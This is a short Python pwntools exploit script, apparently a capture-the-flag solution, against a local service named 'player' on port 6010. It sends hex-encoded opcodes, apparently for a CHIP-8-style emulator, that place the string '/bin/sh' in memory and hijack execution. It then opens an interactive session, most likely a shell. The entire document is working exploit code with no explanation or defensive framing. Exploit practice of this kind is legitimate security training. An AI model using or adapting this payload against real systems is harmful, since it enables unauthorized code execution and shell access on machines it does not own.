from pwn import *


elf = context.binary = ELF('./player')



p =remote('localhost', 6010)
#p =process()
code = ''
code += '61ff'
code += '2006'

code += 'a000'
code += 'afff'
code += 'ff65'

code += '712c'
code += 'ff55'

code += 'a50f'
code += '613b'
code += 'f11e'

code += 'a000'
code += 'f065'

#68732f6e69622f
code += '612f'
code += '6262'
code += '6369'
code += '646e'
code += '652f'
code += '6673'
code += '6768'
code += '6800'

code += '00ee'

code = bytes.fromhex(code) 
p.sendline(code)
p.interactive()